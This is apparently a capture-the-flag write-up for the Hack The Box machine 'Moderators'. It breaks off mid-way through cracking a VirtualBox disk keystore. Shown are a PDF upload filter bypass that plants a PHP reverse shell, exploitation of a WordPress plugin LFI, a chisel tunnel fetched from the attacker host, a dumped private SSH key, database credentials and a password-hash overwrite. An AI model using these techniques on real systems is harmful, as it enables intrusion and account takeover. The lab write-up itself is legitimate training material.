---
layout: single
title: Moderators - Hack The Box
excerpt: "Moderators is a hard-rated Linux machine from Hack The Box. Doing this box about a month after release it has a very low rating of only 2.6, and honestly I do agree. Throughout this box you'll enumerate, enumerate and then enumerate some more. The few vulnerabilities presented have low quality in terms that you will learn little to nothing. That path to root is unique but sadly more annoying then fun/interesting. I see why the box creator went this way, as it show cases something never seen on Hack The Box - but to be honest, this box has nothing to do with hacking. If you need the points, go ahead and do this box, if not I'd advise you to do something else with your time. "
date: 2022-09-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-moderators/moderators_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
  unreleased: true
categories:
  - hackthebox
tags:  
  - linux
  - hard
  - file upload
  - tunneling
  - vboxdie-cracker
  - luks
  - bruteforce-luks
---

![](/assets/images/htb-writeup-moderators/moderators_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

Moderators is a hard-rated Linux machine from Hack The Box. Doing this box about a month after release it has a very low rating of only 2.6, and honestly I do agree. Throughout this box you'll enumerate, enumerate and then enumerate some more. The few vulnerabilities presented have low quality in terms that you will learn little to nothing. That path to root is unique but sadly more annoying then fun/interesting. I see why the box creator went this way, as it show cases something never seen on Hack The Box - but to be honest, this box has nothing to do with hacking. If you need the points, go ahead and do this box, if not I'd advise you to do something else with your time. 

----------------

# USER
### Step 1

```bash
➜  moderators nmap -Pn -n -p- 10.10.11.173
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

➜  moderators nmap -Pn -n -p22,80 -sCV 10.10.11.173
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e (RSA)
|   256 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d (ECDSA)
|_  256 a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Moderators
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
➜  webanalyze ./webanalyze -host http://10.10.11.173
http://10.10.11.173 (0.2s):
    Google Font API,  (Font scripts)
    Font Awesome,  (Font scripts)
    Bootstrap,  (UI frameworks)
    Apache, 2.4.41 (Web servers)
    Ubuntu,  (Operating systems)
```

```bash
➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/FUZZ          
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 35ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 38ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 30ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 35ms]
logs                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 32ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 39ms]

➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/FUZZ
css                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 61ms]
uploads                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 47ms]
```

On port 80 we're met with a very basic and ugly php page for the company _Moderators_. 

![[/assets/images/htb-writeup-moderators/moderators01.png]]

Looking around we find..

.. three names and numbers in the footer - _Jane_, _Holy_ and _Fred_
.. on `/about.php` we find 6 users - _Carl Benjamin_, _David Wall_, _Luna Harper_, _John Miller_, _Anthony Smith_ and _Lexi Marie_. 
.. `blog.php` contain vulnerability reports, mostly regarding sql injections. 
.. `/reports.php?report=8121` contain a masked domain hinting that `moderators.htb` might have a subdomain.
.. `/reports.php?report=4221` nothing of use
.. `/reports.php?report=3478` nothing of use

Use Burp Intruder to loop through 1-10000 on `/reports.php?report=` and we find three new _pending_ reports:
-  `/reports.php?report=2589` nothing of use
-  `/reports.php?report=7612` nothing of use
-  `/reports.php?report=9798` a path to logs - `logs/e21cece511f43a5cb18d4932429915ed/`

```bash
➜  moderators curl -v http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/
*   Trying 10.10.11.173:80...
* Connected to moderators.htb (10.10.11.173) port 80 (#0)
> GET /logs/e21cece511f43a5cb18d4932429915ed/ HTTP/1.1
> Host: moderators.htb
> User-Agent: curl/7.84.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 02 Sep 2022 11:54:32 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT
< ETag: "0-5d1857dcad053"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
```

After fuzzing the directory for a while I find nothing. Instead we change focus and look on the url, and more specific `e21cece511f43a5cb18d4932429915ed`.
```bash
➜  moderators echo -n "e21cece511f43a5cb18d4932429915ed" | wc -c
32

➜  moderators echo -n "9798" | md5sum
e21cece511f43a5cb18d4932429915ed  -
```

The value is the md5sum of log id. Lets use this to see if there is any information we can grab from the other 5 reports.

**2589:**
```bash
➜  moderators echo -n "2589" | md5sum
743c41a921516b04afde48bb48e28ce6  -
➜  moderators curl -v http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/
*   Trying 10.10.11.173:80...
* Connected to moderators.htb (10.10.11.173) port 80 (#0)
> GET /logs/743c41a921516b04afde48bb48e28ce6/ HTTP/1.1
> Host: moderators.htb
> User-Agent: curl/7.84.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 02 Sep 2022 12:06:08 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT
< ETag: "0-5d1857dc68a76"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host moderators.htb left intact
```

**3478:**
```bash
➜  moderators echo -n "3478" | md5sum                                         
b071cfa81605a94ad80cfa2bbc747448  -
➜  moderators curl -v http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/
*   Trying 10.10.11.173:80...
* Connected to moderators.htb (10.10.11.173) port 80 (#0)
> GET /logs/b071cfa81605a94ad80cfa2bbc747448/ HTTP/1.1
> Host: moderators.htb
> User-Agent: curl/7.84.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 02 Sep 2022 12:07:05 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT
< ETag: "0-5d1857dc89dc4"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host moderators.htb left intact
```


**4221:**
```bash
➜  moderators echo -n "4221" | md5sum                                         
74d90aafda34e6060f9e8433962d14fd  -
➜  moderators curl -v http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/
*   Trying 10.10.11.173:80...
* Connected to moderators.htb (10.10.11.173) port 80 (#0)
> GET /logs/74d90aafda34e6060f9e8433962d14fd/ HTTP/1.1
> Host: moderators.htb
> User-Agent: curl/7.84.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 02 Sep 2022 12:07:45 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT
< ETag: "0-5d1857dc7365b"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host moderators.htb left intact
```

**7612:**
```bash
➜  moderators echo -n "7612" | md5sum                                         
ce5d75028d92047a9ec617acb9c34ce6  -
➜  moderators curl -v http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/ 
*   Trying 10.10.11.173:80...
* Connected to moderators.htb (10.10.11.173) port 80 (#0)
> GET /logs/ce5d75028d92047a9ec617acb9c34ce6/ HTTP/1.1
> Host: moderators.htb
> User-Agent: curl/7.84.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 02 Sep 2022 12:08:50 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT
< ETag: "0-5d1857dc949a9"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host moderators.htb left intact
```

**8121:**
```bash
➜  moderators echo -n "8121" | md5sum  
afecc60f82be41c1b52f6705ec69e0f1  -
➜  moderators curl -v http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/
*   Trying 10.10.11.173:80...
* Connected to moderators.htb (10.10.11.173) port 80 (#0)
> GET /logs/afecc60f82be41c1b52f6705ec69e0f1/ HTTP/1.1
> Host: moderators.htb
> User-Agent: curl/7.84.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 02 Sep 2022 12:09:44 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Wed, 24 Nov 2021 09:29:14 GMT
< ETag: "0-5d1857dc7e23f"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host moderators.htb left intact
```

None of them contain any information.. 


### Step 2
Lets create a simple script to loop through 1 to 10000, create it's corresponding md5 hash can send a GET request to `/logs/`. If ``len(response.text)`` is not equal to 0, print the result.
Note that you can achieve the same thing by using `ffuf` or similar, but I though it would be fun to build a simple python script.

This is the end result:
```python
#!/usr/bin/env python3
# by 0xPThree - exploit.se
from colorama import Fore
import hashlib
import requests
import argparse
import time

r = requests.session()
storage = []

def getUrl(target, md5sum):
    # Send GET request
    url = target + md5sum + "/"
    req = r.get(url)
    if req.status_code == 200: #and len(req.text) != 0:
        print("Found something on:", url)
        storage.append(url)
        return
    else:
        return

def createMd5(id):
    md5sum = hashlib.md5(str(id).encode()).hexdigest()
    return(md5sum)
                                                                         

def main():
    start = time.time()
    formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=70)
    parser = argparse.ArgumentParser(formatter_class=formatter)
    parser.add_argument('-t','--target', type=str, help='target url')
    parser.add_argument('-s','--start', type=int, help='start id')
    parser.add_argument('-e','--end', type=int, help='end id')
    args = parser.parse_args()

    # Loop through start to end
    for i in range(args.start, args.end):
        print("Testing nr.", i)
        md5sum = createMd5(i)
        getUrl(args.target, md5sum)

    # Print all results stored in 'storage'
    if not storage:
        print("Nothing found..")
    else:
        for i in range(len(storage)):
            print("Results", i, "-", storage[i])

    end = time.time()
    print("time elapsed:", end - start, "seconds")

    
if __name__ == "__main__":
    main()
```

Sadly running the script with start 1 and end 10000 doesn't give us anything that we already knew.. 
```bash
➜  moderators python3 findLogs.py -t http://moderators.htb/logs/ -s 1 -e 10000
Testing nr. 1
[... snip ...]
Testing nr. 9999
Results 0 - http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/
Results 1 - http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/
Results 2 - http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/
Results 3 - http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/
Results 4 - http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/
Results 5 - http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/
time elapsed: 435.2408220767975 seconds
```

Continue to enumerate the found URLs with `ffuf`, and we find pdfs! 
```bash
➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/FUZZ.pdf
logs                    [Status: 200, Size: 15187, Words: 776, Lines: 239, Duration: 38ms]

➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/FUZZ.pdf
logs                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 29ms]

➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/FUZZ.pdf
logs                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 65ms]

➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/FUZZ.pdf
logs                    [Status: 200, Size: 15042, Words: 771, Lines: 239, Duration: 36ms]

➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/FUZZ.pdf
logs                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 30ms]

➜  moderators ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf
logs                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 31ms]
```

Download all the `log.pfd` files:
```bash
➜  moderators curl http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf -o 2589-logs.pdf
➜  moderators curl http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf -o 3478-logs.pdf
➜  moderators curl http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/logs.pdf -o 4221-logs.pdf
➜  moderators curl http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/logs.pdf -o 7612-logs.pdf
➜  moderators curl http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/logs.pdf -o 8121-logs.pdf
➜  moderators curl http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/logs.pdf -o 9798-logs.pdf
```

![[/assets/images/htb-writeup-moderators/moderators02.png]]

We find even more new paths, `/logs/report_log_upload.php`, a file upload!

![[/assets/images/htb-writeup-moderators/moderators03.png]]


### Step 3
Trying to upload a php webshell is revoked with the text _"Only PDF files are allowed!"_, maybe we can bypass this with burp or maybe upload a malicious PDF.

Playing around with the function we can confirm that we're able to upload PDF files:
![[/assets/images/htb-writeup-moderators/moderators04.png]]

We are not able to bypass the restriction by changing MIME type and/or file extension:
![[/assets/images/htb-writeup-moderators/moderators05.png]]

However we are able to bypass it by adding `%PDF-1.5` at the start of our payload, changing extension to `.pdf.php` and MIME type to `application/pdf`:
![[/assets/images/htb-writeup-moderators/moderators06.png]]

Browsing to the uploaded file, `http://moderators.htb/logs/uploaded/<filename>`, we quickly realize that our mini RCE doesn't work..
![[/assets/images/htb-writeup-moderators/moderators07.png]]
Instead of going for a webshell, lets go for a php reverse shell right away. The one from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) is usually my go to, and the one used here.
![[/assets/images/htb-writeup-moderators/moderators08.png]]


### Step 4
Enumerate the box manually as user `www-data`.
- We're unable to run any commands as sudo - `sudo -l`
- In `/home/` we find two users - `john` and `lexi`
	- We got read and execute privileges in `lexi`'s home directory, however we're unable to read `user.txt` and/or any file in `.ssh`
```bash
drwxrwx---  7 john john 4096 Jul 14 15:51 john
drwxr-xr-x  5 lexi lexi 4096 Jul 14 10:50 lexi
```
- MySQL is running locally on port 3306, however we don't have any credentials to login, yet. And a local webserver (I guess) is running on port 8080
```bash
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -    
```
- There is nothing of use in `/var/www/html`
- We find what seems to be a new version of the site under `/opt/site.new/`
	- We're unable to read `wp-config.php`
	- There are two installed plugins, `brandfolder` & `passwords-manager`, found under `/opt/site.new/wp-content/plugins`
- Running `ps aux` we can see that user `lexi` runs a script (`/usr/local/sbin/startup.sh`) to start the webserver in `/opt/site.new/`
```bash
$ ps aux
root         822  0.0  0.0   8368  3748 ?        Ss   07:20   0:00 /usr/sbin/runuser -u lexi /usr/local/sbin/startup.sh
lexi         865  0.0  0.0   2608   596 ?        S    07:20   0:00 /bin/sh /usr/local/sbin/startup.sh
lexi         866  0.0  0.7 228360 31740 ?        S    07:20   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/

$ cat /usr/local/sbin/startup.sh
#!/bin/sh
/usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/
```

Upload `chisel` and setup a tunnel to start enumerate the local webservice. 
**Note:** Port 8080 collides with my proxy settings, so I need to close this before setting up chisel.

```bash
# Start server locally
➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server -p 4444 -reverse

# Upload and run chisel client
www-data@moderators:/dev/shm$ wget http://10.10.14.5/chisel_1.7.7_linux_amd64
www-data@moderators:/dev/shm$ chmod +x chisel_1.7.7_linux_amd64
www-data@moderators:/dev/shm$ ./chisel_1.7.7_linux_amd64 client 10.10.14.5:4444 R:8080:127.0.0.1:8080
2022/09/05 08:34:41 client: Connecting to ws://10.10.14.5:4444
2022/09/05 08:34:41 client: Connected (Latency 27.873433ms)
```

The new site is a total mess, probably because it refers to `moderators.htb` which I'm to lazy to fix in `/etc/hosts`.
![[/assets/images/htb-writeup-moderators/moderators09.png]]


### Step 5
Googling around we find that the plugin `brandfolder` have a [LFI/RFI vulnerability](https://www.exploit-db.com/exploits/39591), we should be able to exploit this to run commands as user `lexi`.

Copy a new php reverse shell to `/dev/shm/`, name it to `wp-load.php` as per instructions and browse to `http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/` to trigger the reverse shell. And yes, the chisel tunnel needs to be up and running when triggering the reverse shell.

```bash
www-data@moderators:/dev/shm$ mv rev.php wp-load.php

➜  moderators nc -lvnp 4499
listening on [any] 4499 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.173] 37260
$ id && hostname
uid=1001(lexi) gid=1001(lexi) groups=1001(lexi),1002(moderators)
moderators

$ cat user.txt && cat .ssh/id_rsa
abbfc3e262e116c1559b3a2a97bdc041
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Double check that `lexi`'s id_rsa can be used for persistence before closing all reverse connections.
```
➜  moderators vim lexi-id_rsa 
➜  moderators chmod 400 lexi-id_rsa
➜  moderators ssh lexi@moderators.htb -i lexi-id_rsa
lexi@moderators:~$
```

------------------

# ROOT
### Step 1
We are now able to read `wp-config.php`:
```
lexi@moderators:/opt/site.new$ cat wp-config.php
[... snip ...]
/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpresspassword123!!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Look if there are any users in the SQL Database:
```bash
lexi@moderators:/opt/site.new$ mysql -u wordpressuser -p
Enter password: wordpresspassword123!!
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 40
Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_options                 |
| wp_pms_category            |
| wp_pms_passwords           |
| wp_postmeta                |
| wp_posts                   |
| wp_prflxtrflds_fields_meta |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_termmeta                |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
| wp_wpfm_backup             |
+----------------------------+
16 rows in set (0.000 sec)

MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0 | admin         | admin@moderators.htb | http://192.168.1.4:8080 | 2021-09-11 05:30:20 |                     |           0 | admin        |
|  2 | lexi       | $P$BZ0Fj92qgnvg4F52r3lpwHejcXag461 | lexi          | lexi@moderators.htb  |                         | 2021-09-12 16:51:16 |                     |           0 | lexi         |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
```

We're unable to crack any of the hashes
```bash
➜  moderators cat wp.hash                                                      
admin:$P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0
lexi:$P$BZ0Fj92qgnvg4F52r3lpwHejcXag461
➜  moderators hashcat -a0 -m400 wp.hash /usr/share/wordlists/rockyou.txt --user
```

Instead we investigate the possibility of changing the password for user `admin`. 
From the site [useotools.com](https://www.useotools.com/wordpress-password-hash-generator/output) we write wanted password and are returned both the hash and also the SQL Query needed to update the table.

![[/assets/images/htb-writeup-moderators/moderators10.png]]

```bash
MariaDB [wordpress]> UPDATE `wp_users` SET `user_pass` = '$P$Butw21NZp/bVFKSgE6gbBKtLjkl3tQ/' WHERE user_login = 'admin';
Query OK, 1 row affected (0.002 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [wordpress]> select * from wp_users;
[... snip ...]
|  1 | admin      | $P$Butw21NZp/bVFKSgE6gbBKtLjkl3tQ/ 
```

Set up a new SSH tunnel and login through `http://127.0.0.1:8080/wp-login.php`. Trying to login we're forwarded to `http://moderators.htb:8080/xxx` and trying to edit `moderators.htb` to `127.0.0.1` invalidate the login. So edit `/etc/hosts` and add `moderators.htb` to `127.0.0.1`.

Try to login again and everything works as intended:
![[/assets/images/htb-writeup-moderators/moderators11.png]]


### Step 2
At the bottom of the nav bar we find the second plugin _"PWDMS"_, check it out and we find the credentials `carl:Carl@thebest**` as well as `john`'s private SSH key..

![[/assets/images/htb-writeup-moderators/moderators12.png]]

Copy the private key and re-format it, myself I use [samltool.com](https://www.samltool.com/format_privatekey.php) for this purpose. 

```bash
➜  moderators vim john-id_rsa 
➜  moderators chmod 400 john-id_rsa               
➜  moderators ssh john@10.10.11.173 -i john-id_rsa
john@moderators:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),1002(moderators)
```

Doing some manual enumeration as `john` we find internal conversation logs talking about password policies and vbox etc:
```bash
john@moderators:~/stuff/exp$ strings *
```

We find the encrypted _.vdi_ as well as the informational _.vbox_ files:
```bash
john@moderators:~/stuff/VBOX$ ls -al
total 118800
drwxr-xr-x 2 john john      4096 Jul 14 10:50 .
drwxr-xr-x 4 john john      4096 Jul 14 10:50 ..
-rwxr-xr-x 1 john john      5705 Sep 18  2020 2019-08-01.vbox
-rwxr-xr-x 1 john john 121634816 Sep 18  2020 2019.vdi

john@moderators:~/stuff/VBOX$ cat 2019-08-01.vbox
[... snip ...]
<VirtualBox xmlns="http://www.virtualbox.org/" version="1.16-windows">
  <Machine uuid="{528b3540-b8be-4677-b43f-7f4969137747}" name="Moderator 1" OSType="Ubuntu_64" snapshotFolder="Snapshots" lastStateChange="2021-09-15T16:44:57Z">
    <MediaRegistry>
      <HardDisks>
        <HardDisk uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}" location="F:/2019.vdi" format="VDI" type="Normal">
          <Property name="CRYPT/KeyId" value="Moderator 1"/>
          <Property name="CRYPT/KeyStore" value="U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&#13;&#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&#13;&#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&#13;&#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&#13;&#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&#13;&#10;gwC6MrGLZFhl1g=="/>
```

The KeyStore seems interesting, and investigating we quickly find that we can crack it using [pyvboxdie-cracker](https://github.com/axcheron/pyvboxdie-cracker):
```bash
➜  pyvboxdie-cracker git:(master) ✗ python3 pyvboxdie-cracker.py -v /htb/moderators/2019-08-01.vbox -d wordlist.txt                   
Starting pyvboxdie-cracker...

[*] Encrypted drive found :  F:/2019.vdi
[*] KeyStore information...
	Algorithm = AES-XTS256-PLAIN64
	Hash = PBKDF2-SHA256
	Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f

[*] Starting bruteforce...
	19 password tested...
	49 password tested...
	67 password tested...

